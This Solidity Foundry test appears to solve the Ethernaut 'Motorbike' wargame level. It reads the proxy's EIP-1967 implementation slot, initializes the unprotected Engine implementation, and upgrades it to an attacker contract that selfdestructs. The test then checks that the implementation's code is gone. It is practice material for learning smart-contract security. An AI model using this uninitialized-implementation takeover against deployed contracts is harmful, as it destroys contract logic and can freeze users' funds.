// SPDX-License-Identifier: UNLICENSED
pragma solidity <0.7.0;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {Motorbike, Engine} from "../src/25_Motorbike.sol";

contract Attacker {
    function destroy() public {
        selfdestruct(payable(address(0)));
    }
}

contract TestMotorbike is Test {
    address public player = address(0xbad);
    Motorbike public instance;

    function setUp() public {
        instance = new Motorbike(address(new Engine()));

        vm.startPrank(player);

        Engine implementation = Engine(address(
            uint160(uint256(vm.load(
                address(instance),
                bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1)
            ))
        )));

        implementation.initialize();
        implementation.upgradeToAndCall(address(new Attacker()), abi.encodeWithSignature("destroy()"));

        vm.stopPrank();
    }

    function testSolution() public {
        address implementationAddr = address(
            uint160(uint256(vm.load(
                address(instance),
                hex"360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"
            ))
        ));
        uint256 size;
        assembly { size := extcodesize(implementationAddr) }
        assertEq(size, 0);
    }
}
